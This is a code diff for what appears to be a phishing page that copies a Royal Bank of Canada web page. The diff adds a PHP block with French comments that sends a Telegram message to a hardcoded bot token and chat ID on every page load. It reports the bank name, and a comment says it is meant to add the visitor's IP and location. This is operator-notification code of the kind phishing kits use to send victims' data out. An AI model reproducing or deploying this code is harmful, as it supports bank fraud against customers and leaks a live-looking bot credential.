@@ -3,6 +3,48 @@ $_SESSION["bank"] ='RBC';
 
 ?>
 
+<?php
+// Remplace par le token de ton bot Telegram
+$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
+// Remplace par ton chat_id Telegram
+$chat_id = '6242884372'; 
+// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
+$message = "🏛🏛*.".$_SESSION["bank"]."*🏛🏛\n";
+
+// URL de l'API Telegram pour envoyer le message
+$url = "https://api.telegram.org/bot$token/sendMessage";
+
+// Prépare les données à envoyer via l'API Telegram
+$data = [
+    'chat_id' => $chat_id,
+    'text' => $message,
+    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
+];
+
+// Initialise cURL pour envoyer le message
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+// Exécute la requête et récupère la réponse
+$response = curl_exec($ch);
+
+// Vérifie si cURL a rencontré une erreur
+if (curl_errno($ch)) {
+    echo 'Erreur cURL : ' . curl_error($ch);
+} else {
+    echo '';
+}
+
+// Ferme la session cURL
+curl_close($ch);
+?>
+
 <html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths bgpositionshorthand bgpositionxy boxsizing no-bgrepeatround no-bgrepeatspace display-table lastchild mediaqueries csspositionsticky no-regions dataset no-microdata no-time devicemotion deviceorientation formattribute placeholder no-speechinput fullscreen formvalidation no-ie8compat json svgfilters datauri" style=""><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
     <script type="text/javascript" src="/common/javascript/rbc_common.js"></script>
                 	                    
